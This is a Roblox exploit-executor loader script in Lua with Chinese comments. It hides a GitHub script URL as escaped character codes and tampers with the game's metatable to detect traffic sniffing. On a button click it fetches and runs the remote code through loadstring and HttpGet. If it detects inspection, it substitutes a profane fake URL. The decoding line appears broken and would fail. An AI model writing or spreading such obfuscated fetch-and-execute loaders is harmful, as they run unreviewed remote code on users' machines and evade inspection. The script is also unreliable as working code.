--// 🛡️ Roblox 防 Hook 抓包示例 + 弹窗 + 按钮

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

--===[ 👀 真正的 URL 用转义存储 ]===
local encodedURL = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\120\\105\\97\\111\\107\\111\\110\\103\\54\\47\\50\\56\\50\\56\\53\\53\\57\\56\\47\\114\\101\\102\\115\\47\\104\\101\\97\\100\\115\\47\\109\\97\\105\\110\\47\\98\\98\\98\\46\\108\\117\\97"

--===[ 🪤 防 Hook 检测 ]===
local isHooked = false

local function detectHook()
    local success, mt = pcall(getrawmetatable, game)
    if success and mt then
        pcall(function()
            setreadonly(mt, false)
            local old = mt.__namecall

            mt.__namecall = function(...)
                warn("[⚠️ Hook 检测] 检测到 __namecall 被 Hook")
                isHooked = true
                return old(...)
            end
        end)
    end
end

detectHook()

--===[ 🪤 定时重复检测（可选） ]===
task.spawn(function()
    while task.wait(5) do
        detectHook()
    end
end)

--===[ 🗔 创建弹窗 UI ]===
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiSniffUI"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Parent = screenGui

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 200, 0, 50)
button.Position = UDim2.new(0.5, -100, 0.5, -25)
button.Text = "点我执行脚本"
button.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.SourceSansBold
button.TextSize = 24
button.Parent = frame

--===[ 🔑 点击按钮执行真实或伪造 URL ]===
button.MouseButton1Click:Connect(function()
    local finalURL

    if isHooked then
        warn("⚠️ 检测到 Hook，使用假 URL")
        finalURL = "抓你妈"
    else
        -- 解码 \ 转义字符串
        finalURL = string.char(table.unpack(string.split(encodedURL:gsub("\\",""), "\\")))
    end

    local success, err = pcall(function()
        loadstring(game:HttpGet(finalURL))()
    end)

    if success then
        print("✅ 脚本已执行")
    else
        warn("⚠️ 执行失败：", err)
    end
end)
